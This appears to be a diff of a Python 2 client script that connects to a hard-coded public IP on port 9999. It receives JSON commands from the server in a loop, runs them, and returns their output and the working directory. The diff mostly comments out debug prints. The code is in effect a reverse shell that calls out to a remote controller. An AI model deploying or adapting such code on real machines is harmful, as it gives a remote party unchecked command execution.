@@ -26,9 +26,7 @@ def connectToServer():
 	host = '54.202.173.225' # Put in instance server's IPv4 Public IP - 54.202.173.225, localhost
 	port = 9999                # Port of server
 	print "Trying to connect to: {} at {}".format(host, port)
-	#s.connect(('2607:fea8:879f:f7b4:a5bf:e5e9:d8f1:2843', port,0,0))
 	s.connect((host,port))
-	print s
 
 	# Initially, send current working directory to server
 	currentDir = os.getcwd()
@@ -39,7 +37,7 @@ def connectToServer():
 	while True: 
 		print "Waiting for command..."
 		data = s.recv(1024)	# Receive command from server
-		print "raw data from server: {}".format(data)
+		#print "raw data from server: {}".format(data)
 		data = json.loads(data)
 		
 		# Extract commands into separate words
@@ -78,7 +76,6 @@ def connectToServer():
 				
 				# Check if script or not
 				lastArg = commandsWords[len(commandsWords) - 1]
-				#print "\ncommandsWords is: {}\n".format(lastArg)
 				# check if last arg is .sh so script, so just return string saying ran script
 				if lastArg[-3:] == ".sh":	
 					print "Its a script"
@@ -100,13 +97,13 @@ def connectToServer():
 		sendBack["currentDir"] = newDir
 		sendBack["exception"] = str(exception)
 		sendBack["commandOutput"] = str(commandOutput)
-		print "sendBack1 is: {}".format(sendBack)
 		
+		#print "raw sendBack is: \n{}".format(sendBack)
 		sendBackFormatted = json.dumps(sendBack) #data serialized
-		print "sendBack2 is: {}".format(sendBack)
+		#print "sendBackFormatted is: \n{}".format(sendBackFormatted)
 		
-		sendBackFormatted = str.encode(sendBackFormatted)
-		print "sendBack3 is: {}".format(sendBack)
+		#sendBackFormatted = str.encode(sendBackFormatted)
+		#print "sendBack3 is: {}".format(sendBack)
 		
 		#s.sendall(sendBackFormatted)
 		send_msg(s, sendBackFormatted)
